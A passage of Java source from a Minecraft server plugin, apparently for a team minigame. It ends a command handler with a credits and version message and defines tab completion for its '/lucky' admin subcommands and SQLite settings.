                    ChatColor.GREEN + "Made by " + ChatColor.YELLOW + "@Tizfaver" + ChatColor.GREEN + " and" + ChatColor.YELLOW + " @Pingu-io" + ChatColor.GREEN + "\n" +
                    ChatColor.GREEN + "Version: " + ChatColor.YELLOW + "" + plugin.getDescription().getVersion() + ChatColor.GREEN + ". \n" +
                    ChatColor.GREEN + "Date Last update: " + ChatColor.YELLOW + "27/07/2023" + ChatColor.GREEN + ". \n" +
                    ChatColor.GREEN + "MC compatible versions: " + ChatColor.YELLOW + "1.8 up to 1.20.1" + ChatColor.GREEN + ".");
        } else {
            player.sendMessage(ChatColor.RED + "Invalid command");
            return true;
        }

        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if(args.length == 1){ //subito dopo il /lucky <qui>
            List<String> stringList = new ArrayList<>();
            stringList.add("help");
            stringList.add("help2");
            stringList.add("setmaxplayers");
            stringList.add("setminplayers");
            stringList.add("setgametype");
            stringList.add("setwaitingspawn");
            stringList.add("timetostart");
            stringList.add("returnlobby");
            stringList.add("showconfig");
            stringList.add("newteam");
            stringList.add("setspawnteam");
            stringList.add("setnexusteam");
            stringList.add("deleteteam");
            stringList.add("save");
            stringList.add("newitem");
            stringList.add("setminy");
            stringList.add("settimemax");
            stringList.add("sidebar");
            stringList.add("rem_starterblock");
            stringList.add("rem_endblock");
            stringList.add("timeafterend");
            stringList.add("sqlite");
            stringList.add("setmapname");
            stringList.add("enablemapmargin");
            stringList.add("mapmargin1");
            stringList.add("mapmargin2");
            stringList.add("clear_inv_onjoin");
            stringList.add("give_back_tool");
            stringList.add("give_team_selector");
            stringList.add("show_selected_team");
            stringList.add("setnexusblock");
            stringList.add("setspawnblock");
            stringList.add("setfixedday");
            stringList.add("tab_list");
            stringList.add("name_player_team_color");
            stringList.add("death_messages");
            return stringList;
        } else { //dopo ancora il /lucky <x> <qui>
            List<String> stringList = new ArrayList<>();
            if (args[0].equals("sqlite")) {
                stringList.add("enabled");
                stringList.add("id");
                stringList.add("dbpath");
                stringList.add("tablename");
            }
            return stringList;
        }
    }
}

